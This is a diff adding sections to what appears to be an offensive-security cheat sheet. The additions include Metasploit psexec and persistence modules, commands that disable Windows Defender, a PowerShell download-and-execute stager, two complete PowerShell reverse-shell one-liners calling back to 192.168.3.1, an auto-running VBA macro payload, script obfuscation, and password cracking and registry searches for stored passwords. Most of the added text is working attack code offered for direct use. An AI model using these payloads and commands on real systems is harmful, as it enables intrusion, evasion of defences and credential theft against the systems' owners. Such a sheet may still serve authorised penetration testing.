@@ -53,14 +53,39 @@ auxiliary/scanner/ssh/ssh_login
 ```
 ### SMB
 ```
-auxiliary/scanner/smb/smb_login
+exploit/windows/smb/psexec
 ```
 ## Pivoting
-- ```post/multi/manage/autoroute```
-- ```auxiliary/server/socks_proxy```
+- ```
+post/multi/manage/autoroute
+```
+- ```
+auxiliary/server/socks_proxy
+```
 
+## Gathering
+### Enum Shares
+```
+post/windows/gather/enum_shares
+```
+
+
+## Persistence
+```
+exploit/windows/local/persistence
+```
 
 # Powershell
+## Windows Defender
+### Add exclusion
+```powershell
+Set-MpPreference -ExclusionPath
+```
+### Disable RTP
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
 ## Scheduled jobs
 ### Register
 ```powershell
@@ -80,6 +105,34 @@ Unregister-ScheduledJob -Name "" -Force
 ### Download
 ```powershell
 Invoke-WebRequest -Uri "" -OutFile ""
+```
+
+### Reverse Shell
+#### Stager
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.3.1:8888/stage.ps1')
+```
+#### Stage
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('192.168.3.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+$sm=(New-Object Net.Sockets.TCPClient('192.168.3.1',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+```
+#### VBA payload
+```vba
+Sub lulz()
+    strCommand = "powershell -windowstyle hidden {obfuscated_stager}"
+    Set WshShell = CreateObject("WScript.Shell")
+    Set WshShellExec = WshShell.Exec(strCommand)
+    strOutput = WshShellExec.StdOut.ReadAll
+End Sub
+Sub Auto_Open()
+    lulz
+End Sub
+```
+## Invoke-Obfuscation
+```ps1
+Invoke-Obfuscation -ScriptPath .\script.ps1 -Quiet -NoExit -Command 'Token\\String\\1,2,\\Whitespace\\1,\\Command\\1,3'
 ```
 
 # AD Enumeration/Exploitation
@@ -114,7 +167,7 @@ kerbrute userenum --dc domain controller -d domain -o logfile usernameslist
 # Hashcat
 ### Bruteforce
 ```bash
-hashcat -m 1000 -a 3 -w 4 -1 ?l012345 -i hash.txt
+hashcat -m 1000 -a 3 -w 4 -1 ?l012345 -i hash.txt ?1?1?1?1
 ```
 
 ### Charsets
@@ -128,8 +181,6 @@ hashcat -m 1000 -a 3 -w 4 -1 ?l012345 -i hash.txt
 ?a = ?l?u?d?s
 ?b = 0x00 - 0xff
 ```
-
-
 
 ### KRB5TGS
 ```
@@ -145,6 +196,30 @@ hashcat -m 1000 -a 3 -w 4 -1 ?l012345 -i hash.txt
 ```bash
 hydra -l login -P pass.txt example.com http-post-form "/admin/login:username=^USER^&pass=^PASS^:F=login failed"
 ```
+
+# Windows Priv Esc
+## Registry
+### Query AutoRun executables
+`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+
+### Query service info
+`reg query HKLM\System\CurrentControlSet\Services\service1`
+
+### AlwaysInstallElevated
+`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+### Query for passwords 
+`reg query HKLM /f password /t REG_SZ /s`
+
+## accesschk.exe
+### Check users permissions on service
+`accesschk.exe /accepteula -uwcqv user svc`
+
+### Check write permissions on directory
+`accesschk.exe /accepteula -uwdq "path"`
+
+### Check permissions on registry entry
+`accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`
 
 # Misc
 ### PHP filter
